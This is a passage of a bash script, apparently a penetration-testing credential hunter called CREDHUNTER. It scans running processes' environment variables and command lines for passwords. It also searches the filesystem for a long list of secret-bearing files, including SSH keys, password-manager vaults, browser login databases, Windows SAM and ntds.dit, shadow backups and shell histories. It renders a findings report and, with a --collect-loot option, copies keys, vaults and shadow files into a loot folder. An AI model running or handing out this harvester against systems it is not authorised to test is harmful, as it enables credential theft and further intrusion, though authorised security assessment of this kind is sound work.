  tr '\0' '\n' < "$f" 2>/dev/null | grep -iE '(PASS|PASSWORD|SECRET|TOKEN|MYSQL_PWD|PGPASSWORD|RABBITMQ_PASS|MQTT_PASSWORD)=' | while IFS= read -r kv; do
    [[ -z "$kv" ]] && continue
    local key val
    key="${kv%%=*}"
    val="${kv#*=}"
    [[ -z "$val" ]] && continue
    if is_placeholder "$val"; then continue; fi
    emit_finding rule_id=proc.environ category=PASSWORD conf=MEDIUM base_conf=MEDIUM \
      path="$f" line_no=0 line_text="$kv" match_text="$val" key_name="pid=$pid env=$key"
  done
}

scan_proc_cmdline() {
  local f="$1"
  [[ ! -r "$f" ]] && return 0
  local pid cmd
  pid="$(basename "$(dirname "$f")")"
  cmd="$(tr '\0' ' ' < "$f" 2>/dev/null)"
  [[ -z "$cmd" ]] && return 0
  case "$cmd" in
    *MYSQL_PWD=*|*PGPASSWORD=*)
      local val
      val="$(printf '%s' "$cmd" | grep -oE '(MYSQL_PWD|PGPASSWORD)=[^[:space:]]+' | head -1 | sed -E 's/^[A-Z_]+=//')"
      [[ -z "$val" ]] && return 0
      is_placeholder "$val" && return 0
      emit_finding rule_id=proc.cmdline category=PASSWORD conf=MEDIUM base_conf=MEDIUM \
        path="$f" line_no=0 line_text="$(truncate_line "$cmd" 256)" match_text="$val" \
        key_name="pid=$pid"
      ;;
  esac
  if [[ "$cmd" =~ (-p[[:space:]]+|-P[[:space:]]+|--password[[:space:]]*=[[:space:]]*|--pass[[:space:]]*=[[:space:]]*)([^[:space:]]+) ]]; then
    local val="${BASH_REMATCH[2]}"
    case "$cmd" in *mysql*|*psql*|*sshpass*|*curl*|*wget*|*smbclient*|*rsync*) ;; *) return 0 ;; esac
    is_placeholder "$val" && return 0
    emit_finding rule_id=proc.cmdline category=PASSWORD conf=MEDIUM base_conf=MEDIUM \
      path="$f" line_no=0 line_text="$(truncate_line "$cmd" 256)" match_text="$val" \
      key_name="pid=$pid"
  fi
}

run_phase2() {
  [[ "$SKIP_KNOWN" -eq 1 ]] && return 0
  log_phase "phase 2/5" "known-locations sweep"
  local pre post
  pre="$(wc -l < "$FIND_JSONL" 2>/dev/null || echo 0)"
  local pat target
  for pat in "${KNOWN_PATHS[@]}"; do
    for target in $pat; do
      [[ -e "$target" ]] || continue
      if [[ -d "$target" ]]; then
        find "$target" -type f 2>/dev/null | while IFS= read -r f; do
          scan_known_path "$f"
        done
      else
        scan_known_path "$target"
      fi
    done
  done
  if [[ -d /proc ]]; then
    for pid_dir in /proc/[0-9]*; do
      [[ -d "$pid_dir" ]] || continue
      local environ="$pid_dir/environ"
      local cmdline="$pid_dir/cmdline"
      [[ -r "$environ" ]] && scan_proc_environ "$environ"
      [[ -r "$cmdline" ]] && scan_proc_cmdline "$cmdline"
    done
  fi
  post="$(wc -l < "$FIND_JSONL" 2>/dev/null || echo 0)"
  log_info "  $(( post - pre )) findings"
}

CLASS_A_GLOBS=(
  '*.kdbx' '*.kdb' '*.psafe3' '*.agilekeychain' '*.opvault' '*.1pif'
  '*.bitwarden_export.json' 'bw_export_*.csv' 'lastpass_export*.csv'
  'LastPassExport*.csv' 'Dashlane Export*.csv' 'enpass*.json'
  'key3.db' 'key4.db' 'logins.json' 'signons.sqlite' 'cert9.db'
  'Login Data' 'Login Data For Account' 'Cookies' 'Web Data' 'Local State'
  'id_rsa' 'id_dsa' 'id_ecdsa' 'id_ed25519' 'id_xmss' 'id_ecdsa_sk' 'id_ed25519_sk'
  '*.pem' '*.key' '*.priv' '*.pk8' '*.pkcs8' '*.rsa' '*.dsa' '*.ec' '*.ppk' '*.openssh'
  'authorized_keys' 'authorized_keys2' 'known_hosts' 'ssh_host_*_key'
  '*.pfx' '*.p12' '*.jks' '*.keystore' '*.bks' '*.uber' '*.pkcs12'
  '.netrc' '_netrc' '.pgpass' '.my.cnf' '.mylogin.cnf' '.htpasswd'
  '.smbcredentials' '.cifs-credentials' '.credentials' '.git-credentials'
  '.npmrc' '.yarnrc.yml' '.yarnrc' 'kubeconfig' '*.kubeconfig'
  '*.ovpn' 'wg0.conf' 'krb5.keytab' '*.keytab' 'krb5cc_*'
  'azureProfile.json' 'accessTokens.json' 'application_default_credentials.json'
  'credentials.db' 'rclone.conf'
  'Groups.xml' 'Services.xml' 'ScheduledTasks.xml' 'Drives.xml' 'Printers.xml' 'DataSources.xml'
  'unattend.xml' 'Unattend.xml' 'autounattend.xml' 'Autounattend.xml'
  'sysprep.inf' 'sysprep.xml'
  'shadow.bak' 'shadow.old' 'shadow-' 'passwd.bak' 'passwd-' 'gshadow.bak'
  'SAM' 'SYSTEM' 'SECURITY' 'ntds.dit'
  'WinSCP.ini' 'sitemanager.xml' 'recentservers.xml' 'filezilla.xml' 'confCons.xml'
  'MobaXterm.ini' '*.rdg' '*.rdp' '*.ica' '*.rtsz' '*.rtsx'
  'RDCMan.settings' '*.tds'
  'settings.xml' 'application.properties' 'application*.properties'
  'application.yml' 'application*.yml' 'bootstrap.yml'
  'credentials.xml' 'master.key' 'hudson.util.Secret' 'initialAdminPassword'
  '.env' '.env.*' 'wp-config.php' 'wp-config-sample.php'
  'configuration.php' 'LocalSettings.php' 'local.xml' 'database.yml'
  'web.config' 'app.config' 'machine.config' 'connectionStrings.config'
  'tnsnames.ora' 'sqlnet.ora' 'wallet.sso' 'cwallet.sso'
  '.bash_history' '.zsh_history' '.fish_history'
  '.mysql_history' '.psql_history' '.sqlite_history'
  'ConsoleHost_history.txt'
)

KEYWORD_GLOBS=(
  '*password*' '*pass*.txt' '*cred*' '*credential*' '*secret*'
  'pw.txt' 'pwd.txt' '*.passwd' '*.pass' '*.creds'
)

matches_glob_set() {
  local name="$1"
  shift
  local name_lower
  name_lower="$(printf '%s' "$name" | tr '[:upper:]' '[:lower:]')"
  local g g_lower
  for g in "$@"; do
    case "$name" in $g) return 0 ;; esac
    g_lower="$(printf '%s' "$g" | tr '[:upper:]' '[:lower:]')"
    case "$name_lower" in $g_lower) return 0 ;; esac
  done
  return 1
}

run_phase3() {
  log_phase "phase 3/5" "filename-pattern hunt"
  local pre post
  pre="$(wc -l < "$FIND_JSONL" 2>/dev/null || echo 0)"
  local r f base
  for r in "${SCAN_ROOTS[@]}"; do
    [[ -d "$r" || -f "$r" ]] || continue
    if [[ -f "$r" ]]; then
      base="$(basename "$r")"
      if matches_glob_set "$base" "${CLASS_A_GLOBS[@]}"; then
        emit_finding rule_id=class_a.filename category=PRIVATE_KEY conf=HIGH base_conf=HIGH \
          path="$r" line_no=0 match_text="$base"
        if ! is_binary "$r"; then scan_file_content "$r"; fi
      elif matches_glob_set "$base" "${KEYWORD_GLOBS[@]}"; then
        emit_finding rule_id=keyword.filename category=PASSWORD conf=MEDIUM base_conf=MEDIUM \
          path="$r" line_no=0 match_text="$base"
        if ! is_binary "$r"; then scan_file_content "$r"; fi
      fi
      continue
    fi
    walk "$r" | while IFS= read -r f; do
      base="$(basename "$f")"
      if matches_glob_set "$base" "${CLASS_A_GLOBS[@]}"; then
        emit_finding rule_id=class_a.filename category=PRIVATE_KEY conf=HIGH base_conf=HIGH \
          path="$f" line_no=0 match_text="$base"
        if ! is_binary "$f"; then scan_file_content "$f"; fi
      elif matches_glob_set "$base" "${KEYWORD_GLOBS[@]}"; then
        emit_finding rule_id=keyword.filename category=PASSWORD conf=MEDIUM base_conf=MEDIUM \
          path="$f" line_no=0 match_text="$base"
        if ! is_binary "$f"; then scan_file_content "$f"; fi
      fi
    done
  done
  post="$(wc -l < "$FIND_JSONL" 2>/dev/null || echo 0)"
  log_info "  $(( post - pre )) findings"
}

ext_matches_default() {
  local name="$1"
  [[ "$name" =~ $DEFAULT_EXT_REGEX ]] && return 0
  [[ "$name" =~ $DEFAULT_EXT_NAMES ]] && return 0
  case "$name" in
    Dockerfile|Containerfile|Jenkinsfile|Makefile|GNUmakefile|.env|.env.*) return 0 ;;
    *.dockerfile|*.Jenkinsfile|*.mk|*.gradle|*.gradle.kts|*.arm.json) return 0 ;;
  esac
  return 1
}

ext_in_skip_list() {
  local name="$1"
  [[ "$name" =~ $SKIP_EXT_REGEX ]] && return 0
  [[ "$name" =~ $SKIP_EXT_REGEX_MIN ]] && return 0
  [[ "$name" =~ $SKIP_LOCKFILE_REGEX ]] && return 0
  if [[ "$INC_ARCHIVES" -eq 0 ]]; then
    case "$name" in
      *.zip|*.gz|*.bz2|*.xz|*.lz|*.lzma|*.7z|*.rar|*.tar|*.tgz|*.tbz2|*.txz|\
*.cab|*.arj|*.jar|*.war|*.ear|*.apk|*.aab|*.ipa|*.nupkg) return 0 ;;
    esac
  fi
  return 1
}

ext_in_include_user() {
  local name="$1" e
  if [[ ${#EXTRA_INCLUDE_EXT[@]} -eq 0 ]]; then return 1; fi
  for e in "${EXTRA_INCLUDE_EXT[@]}"; do
    case "$name" in *".${e}") return 0 ;; esac
  done
  return 1
}

run_phase4() {
  [[ "$SKIP_CONTENT" -eq 1 ]] && return 0
  log_phase "phase 4/5" "content scan"
  local pre post
  pre="$(wc -l < "$FIND_JSONL" 2>/dev/null || echo 0)"
  local cand_list="$OUT_DIR/.candidates"
  : > "$cand_list"
  local r
  for r in "${SCAN_ROOTS[@]}"; do
    if [[ -f "$r" ]]; then
      local name_lower base
      base="$(basename "$r")"
      name_lower="$(printf '%s' "$base" | tr '[:upper:]' '[:lower:]')"
      if ext_in_skip_list "$name_lower"; then continue; fi
      if [[ "$ALL_MODE" -eq 1 ]] || ext_matches_default "$base" || ext_in_include_user "$name_lower"; then
        printf '%s\n' "$r" >> "$cand_list"
      else
        case "$base" in .env|.env.*|.netrc|.pgpass|.my.cnf|.mylogin.cnf|.htpasswd|.git-credentials|.npmrc|.yarnrc|.yarnrc.yml|.bash_history|.zsh_history|.mysql_history|.psql_history|.sqlite_history|.viminfo|.lesshst|.gitconfig)
          printf '%s\n' "$r" >> "$cand_list" ;;
        esac
      fi
      continue
    fi
    [[ -d "$r" ]] || continue
    walk "$r" | while IFS= read -r f; do
      local base name_lower
      base="${f##*/}"
      name_lower="$(printf '%s' "$base" | tr '[:upper:]' '[:lower:]')"
      if ext_in_skip_list "$name_lower"; then continue; fi
      if [[ "$ALL_MODE" -eq 1 ]] || ext_matches_default "$base" || ext_in_include_user "$name_lower"; then
        printf '%s\n' "$f" >> "$cand_list"
      else
        case "$base" in .env|.env.*|.netrc|.pgpass|.my.cnf|.mylogin.cnf|.htpasswd|.git-credentials|.npmrc|.yarnrc|.yarnrc.yml|.bash_history|.zsh_history|.mysql_history|.psql_history|.sqlite_history|.viminfo|.lesshst|.gitconfig)
          printf '%s\n' "$f" >> "$cand_list" ;;
        esac
      fi
    done
  done
  local total
  total="$(wc -l < "$cand_list" 2>/dev/null | tr -d ' ')"
  log_info "  ($total candidate files)"
  if [[ "$SERIAL" -eq 1 || "$WORKERS" -le 1 || "$total" -lt 4 ]]; then
    while IFS= read -r f; do scan_file_content "$f"; done < "$cand_list"
  else
    local self
    self="$(readlink -f "$0" 2>/dev/null || python3 -c 'import os,sys;print(os.path.realpath(sys.argv[1]))' "$0" 2>/dev/null || echo "$0")"
    export CREDHUNTER_WORKER_MODE=1
    export CREDHUNTER_OUT_DIR="$OUT_DIR"
    export CREDHUNTER_MAX_SIZE="$MAX_SIZE"
    export CREDHUNTER_SHOW_SECRETS="$SHOW_SECRETS"
    export CREDHUNTER_MIN_CONF="$MIN_CONF"
    export CREDHUNTER_INC_TEMP="$INC_TEMP"
    export CREDHUNTER_HOSTN="$HOSTN"
    export CREDHUNTER_USER_NAME="$USER_NAME"
    export CREDHUNTER_PRIV="$PRIV"
    if [[ ${#EXTRA_EXCLUDES[@]} -gt 0 ]]; then
      export CREDHUNTER_EXTRA_EXCLUDES="$(IFS=$'\x1f'; printf '%s' "${EXTRA_EXCLUDES[*]}")"
    fi
    xargs -P "$WORKERS" -n 1 -I{} bash "$self" --__worker {} < "$cand_list" 2>/dev/null || true
    unset CREDHUNTER_WORKER_MODE
  fi
  post="$(wc -l < "$FIND_JSONL" 2>/dev/null || echo 0)"
  log_info "  $(( post - pre )) findings"
}

run_phase5() {
  log_phase "phase 5/5" "rendering report"
  local total high med low
  total="$(wc -l < "$FIND_JSONL" 2>/dev/null | tr -d ' ')"
  [[ -z "$total" ]] && total=0
  if [[ "$HAVE_JQ" -eq 1 ]]; then
    high="$(jq -s '[.[] | select(.confidence=="HIGH")] | length' "$FIND_JSONL" 2>/dev/null)"
    med="$(jq -s '[.[] | select(.confidence=="MEDIUM")] | length' "$FIND_JSONL" 2>/dev/null)"
    low="$(jq -s '[.[] | select(.confidence=="LOW")] | length' "$FIND_JSONL" 2>/dev/null)"
  else
    high="$(grep -c '"confidence":"HIGH"' "$FIND_JSONL" 2>/dev/null; true)"
    med="$(grep -c '"confidence":"MEDIUM"' "$FIND_JSONL" 2>/dev/null; true)"
    low="$(grep -c '"confidence":"LOW"' "$FIND_JSONL" 2>/dev/null; true)"
  fi
  [[ -z "$high" ]] && high=0
  [[ -z "$med" ]] && med=0
  [[ -z "$low" ]] && low=0

  local skipped_size skipped_binary skipped_perm skipped_excl
  skipped_size="$(grep -c $'\toversize$' "$SKIPPED_LOG" 2>/dev/null; true)"
  skipped_binary="$(grep -c $'\tbinary$' "$SKIPPED_LOG" 2>/dev/null; true)"
  skipped_perm="$(grep -c $'\tperm$' "$SKIPPED_LOG" 2>/dev/null; true)"
  skipped_excl="$(grep -c $'\texcluded$' "$SKIPPED_LOG" 2>/dev/null; true)"
  [[ -z "$skipped_size" ]] && skipped_size=0
  [[ -z "$skipped_binary" ]] && skipped_binary=0
  [[ -z "$skipped_perm" ]] && skipped_perm=0
  [[ -z "$skipped_excl" ]] && skipped_excl=0

  if [[ "$OUT_MODE" == "console" || "$OUT_MODE" == "both" ]]; then
    printf '\n'
    printf '===============================================================\n'
    printf '  %sHIGH%s-confidence findings (%s)\n' "$C_R" "$C_X" "$high"
    printf -- '---------------------------------------------------------------\n'
    if [[ "$HAVE_JQ" -eq 1 && "$high" -gt 0 ]]; then
      jq -r 'select(.confidence=="HIGH") | "  [HIGH] \(.rule_id) \t\(.abs_path)" + (if (.line_no // 0) > 0 then ":\(.line_no)" else "" end) + (if .match_redacted then "\n         " + .match_redacted else "" end) + (if .notes and .notes != "" then "\n         notes: " + .notes else "" end)' "$FIND_JSONL" 2>/dev/null
    elif [[ "$high" -gt 0 ]]; then
      grep '"confidence":"HIGH"' "$FIND_JSONL" 2>/dev/null | head -50
    fi
    printf '===============================================================\n'
    printf '  %sMEDIUM%s-confidence findings (%s)\n' "$C_Y" "$C_X" "$med"
    printf -- '---------------------------------------------------------------\n'
    if [[ "$HAVE_JQ" -eq 1 && "$med" -gt 0 ]]; then
      jq -r 'select(.confidence=="MEDIUM") | "  [MED ] \(.rule_id) \t\(.abs_path)" + (if (.line_no // 0) > 0 then ":\(.line_no)" else "" end) + (if .match_redacted then "\n         " + .match_redacted else "" end)' "$FIND_JSONL" 2>/dev/null | head -200
    fi
    printf '===============================================================\n'
    printf '  %sLOW%s-confidence findings (%s)\n' "$C_C" "$C_X" "$low"
    printf -- '---------------------------------------------------------------\n'
    if [[ "$HAVE_JQ" -eq 1 && "$low" -gt 0 ]]; then
      jq -r 'select(.confidence=="LOW") | "  [LOW ] \(.rule_id) \t\(.abs_path)" + (if (.line_no // 0) > 0 then ":\(.line_no)" else "" end) + (if .fp_reason and .fp_reason != "" then " (fp=" + .fp_reason + ")" else "" end)' "$FIND_JSONL" 2>/dev/null | head -200
    fi
    printf '===============================================================\n'
    printf '  Summary\n'
    printf -- '---------------------------------------------------------------\n'
    printf '   Total findings:    %5d   (HIGH: %s, MEDIUM: %s, LOW: %s)\n' "$total" "$high" "$med" "$low"
    printf '   Skipped (size):    %5s\n' "$skipped_size"
    printf '   Skipped (binary):  %5s\n' "$skipped_binary"
    printf '   Skipped (perm):    %5s\n' "$skipped_perm"
    printf '   Skipped (excl):    %5s\n' "$skipped_excl"
    printf '   Workers:           %5s\n' "$WORKERS"
    printf '   Report:    %s\n' "$FIND_TXT"
    printf '              %s\n' "$FIND_JSONL"
    printf '              %s\n' "$SKIPPED_LOG"
    printf '              %s\n' "$RECON_JSON"
    if [[ "$SHOW_SECRETS" -eq 1 ]]; then
      printf '   %s[!]%s --show-secrets was used; report contains plaintext. Clean up post-engagement.\n' "$C_Y" "$C_X"
    fi
    if [[ "$COLLECT_LOOT" -eq 1 ]]; then
      printf '   %s[!]%s --collect-loot was used; secrets copied under %s/loot/. Clean up post-engagement.\n' "$C_Y" "$C_X" "$OUT_DIR"
    fi
    printf '===============================================================\n'
  fi

  if [[ "$COLLECT_LOOT" -eq 1 && "$HAVE_JQ" -eq 1 ]]; then
    mkdir -p "$OUT_DIR/loot" 2>/dev/null
    jq -r 'select(.rule_id=="class_a.filename" or .rule_id=="class_a.file_present" or .rule_id=="pem.private_key" or .rule_id=="putty.ppk") | .abs_path' "$FIND_JSONL" 2>/dev/null | sort -u | while IFS= read -r p; do
      [[ -f "$p" && -r "$p" ]] || continue
      local subdir="other"
      case "$p" in
        *id_rsa*|*id_dsa*|*id_ecdsa*|*id_ed25519*|*.pem|*.ppk) subdir="ssh-keys" ;;
        *.kdbx|*.kdb|*.psafe3|*.opvault) subdir="kdbx" ;;
        *shadow*|*passwd*) subdir="shadow" ;;
      esac
      mkdir -p "$OUT_DIR/loot/$subdir" 2>/dev/null
      cp -p -- "$p" "$OUT_DIR/loot/$subdir/" 2>/dev/null || true
    done
  fi
}

trap 'rm -f "$OUT_DIR/.lock" 2>/dev/null' EXIT INT TERM

if [[ "$WORKER_MODE" -eq 1 ]]; then
  if [[ -n "$WORKER_FILE" && -e "$WORKER_FILE" ]]; then
    scan_file_content "$WORKER_FILE"
  fi
  exit 0
fi

run_phase2
run_phase3
run_phase4
run_phase5

EXIT_CODE="$(cat "$EXIT_FILE" 2>/dev/null || echo 0)"
[[ -z "$EXIT_CODE" ]] && EXIT_CODE=0
exit "$EXIT_CODE"
